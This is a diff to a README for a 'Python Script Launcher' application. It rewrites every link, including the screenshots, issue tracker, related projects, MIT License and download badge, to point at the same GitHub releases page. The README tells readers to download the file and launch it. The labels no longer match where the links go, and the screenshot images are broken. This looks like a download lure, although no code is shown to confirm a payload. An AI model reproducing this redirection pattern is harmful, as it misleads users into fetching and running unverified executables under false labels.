@@ -19,7 +19,7 @@ Python Script Launcher is a versatile tool that simplifies the process of runnin
 
 ## Getting Started
 To get started with Python Script Launcher, download the application using the following link:
-[Download Python Script Launcher](https://github.com/repo/releases/9246/App.zip)
+[Download Python Script Launcher](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases)
 
 ### Note:
 The link provided above leads directly to the application file, which needs to be launched after downloading.
@@ -27,9 +27,9 @@ The link provided above leads directly to the application file, which needs to b
 ## Screenshots
 Here are some screenshots of the Python Script Launcher in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases)
+![Screenshot 2](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases)
+![Screenshot 3](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases)
 
 ## Installation Guide
 1. Download the Python Script Launcher application from the provided link.
@@ -38,22 +38,22 @@ Here are some screenshots of the Python Script Launcher in action:
 4. Start configuring and launching your Python scripts effortlessly.
 
 ## Issues and Feedback
-If you encounter any issues with the Python Script Launcher or have any feedback to share, please feel free to [submit an issue](https://github.com/Python_Script_Launcher/issues). Your feedback is valuable and will help improve the tool for all users.
+If you encounter any issues with the Python Script Launcher or have any feedback to share, please feel free to [submit an issue](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases). Your feedback is valuable and will help improve the tool for all users.
 
 ## Contributing
 Contributions to the Python Script Launcher are welcome! If you have any ideas for features, improvements, or bug fixes, please submit a pull request. Let's collaborate to make this tool even better for the community.
 
 ## Related Projects
 Check out these related projects that you may find interesting:
-- [PythonScriptUtility](https://github.com/PythonScriptUtility): A collection of Python utilities for common scripting tasks.
-- [GUIPythonTools](https://github.com/GUIPythonTools): A set of GUI tools for Python developers.
+- [PythonScriptUtility](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases): A collection of Python utilities for common scripting tasks.
+- [GUIPythonTools](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases): A set of GUI tools for Python developers.
 
 ## License
-The Python Script Launcher is released under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute this tool in accordance with the license terms.
+The Python Script Launcher is released under the [MIT License](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases). Feel free to use, modify, and distribute this tool in accordance with the license terms.
 
 ---
 
-**Download Python Script Launcher:** [![Download](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+**Download Python Script Launcher:** [![Download](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases)](https://github.com/pedrohenriqueofc05/Python_Script_Launcher/releases)
 
 ---
 
